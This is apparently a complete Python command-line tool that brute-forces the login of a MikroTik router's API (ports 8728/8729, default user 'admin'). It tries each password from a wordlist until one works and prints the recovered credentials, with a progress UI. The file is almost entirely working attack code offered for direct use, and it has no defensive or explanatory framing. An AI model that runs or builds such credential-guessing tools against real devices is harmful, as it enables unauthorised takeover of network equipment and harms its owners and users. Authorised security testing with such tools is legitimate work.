#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Version: 1.3

import sys
import socket
import ssl
import time
import argparse
import platform
import threading

try:
    from _cli_ui import CLIInterface, print_banner
except Exception as e:
    CLIInterface = None
    def print_banner():
        print("\n[INFO] CLI UI not available.")

try:
    from _api import Api
except ModuleNotFoundError:
    raise ImportError("[ERROR] Module '_api' not found. Make sure the _api.py file is present in the same directory as this tool.")

try:
    from _log import Log
except ModuleNotFoundError:
    raise ImportError("[ERROR] Module '_log' not found. Make sure the _log.py file is present in the same directory as this tool.")

class Bruteforce:
    def __init__(self, target, port, user, wordlist_path, delay, use_ssl=False, ui=None):
        self.target = target
        self.port = port
        self.user = user
        self.delay = delay
        self.wordlist_path = wordlist_path
        self.use_ssl = use_ssl
        self.log = Log(True, None, None)
        self.api = None
        self.ui = ui
        self.wordlist = []
        self.load_wordlist()

    def load_wordlist(self):
        try:
            with open(self.wordlist_path, 'r', encoding='utf-8') as f:
                self.wordlist = [line.strip() for line in f if line.strip()]
        except Exception as e:
            self.log.error(f"Error loading wordlist: {e}")
            exit(1)

    def run(self):
        if self.ui and self.ui.enabled:
            try:
                if threading.current_thread() is threading.main_thread():
                    self.ui.update(status="Running", username=self.user, total=len(self.wordlist))
                    self.ui.start()
                else:
                    raise RuntimeError("signal only works in main thread of the main interpreter")
            except Exception as e:
                self.log.error(f"[ERROR] CLI UI failed to initialize: {e}")
                self.ui = None

        self.log.info("[*] Starting brute force attack...")
        for index, password in enumerate(self.wordlist):
            try:
                self.api = Api(self.target, self.port, use_ssl=self.use_ssl)
                if self.ui and self.ui.enabled:
                    self.ui.update(attempt=index+1, last_password=password)

                if self.api.login(self.user, password):
                    self.log.success(f"[+] Success! User: {self.user} Password: {password}")
                    if self.ui and self.ui.enabled:
                        self.ui.update(success=f"User: {self.user} | Pass: {password}", status="Success")
                    break
                else:
                    self.log.info(f"[-] Attempt {index+1}/{len(self.wordlist)} - Incorrect password: {password}")
            except Exception as e:
                self.log.warning(f"Error trying password '{password}': {e}")

            time.sleep(self.delay)

        self.log.info("[*] Attack finished.")
        if self.ui and self.ui.enabled:
            self.ui.stop()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Mikrotik API Brute Force Tool")
    parser.add_argument("-t", "--target", required=True, help="Mikrotik IP address")
    parser.add_argument("-p", "--port", type=int, default=8728, help="API port (default: 8728)")
    parser.add_argument("-u", "--user", default="admin", help="Username (default: admin)")
    parser.add_argument("-d", "--dictionary", required=True, help="Path to the password wordlist")
    parser.add_argument("-s", "--seconds", type=int, default=1, help="Delay between attempts (default: 1s)")
    parser.add_argument("--ssl", action="store_true", help="Use SSL connection (port 8729)")
    parser.add_argument("--ui", action="store_true", help="Enable interactive CLI interface")
    args = parser.parse_args()

    if not args.ui:
        print_banner()

    enable_ui = args.ui and CLIInterface is not None and platform.system().lower() in ["linux", "darwin", "windows"]
    ui = CLIInterface(enabled=enable_ui) if enable_ui else None

    bf = Bruteforce(
        target=args.target,
        port=args.port,
        user=args.user,
        wordlist_path=args.dictionary,
        delay=args.seconds,
        use_ssl=args.ssl,
        ui=ui
    )
    try:
        bf.run()
    except KeyboardInterrupt:
        if ui and ui.enabled:
            ui.stop()
        print("\n[!] Attack interrupted by user. Exiting cleanly.\n")